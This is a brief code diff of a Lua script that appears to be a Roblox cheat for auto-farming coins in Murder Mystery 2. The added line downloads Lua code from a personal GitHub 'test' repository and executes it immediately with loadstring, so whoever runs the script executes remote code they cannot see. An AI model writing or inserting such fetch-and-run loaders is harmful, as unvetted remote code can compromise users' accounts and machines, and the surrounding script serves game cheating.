@@ -1,4 +1,5 @@
 setfpscap(25)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/gleb228666999/test/refs/heads/main/2.lua'))()
 
 --[[
 Auto Farm Coins - MM2 | GUI ERROR RECONNECT
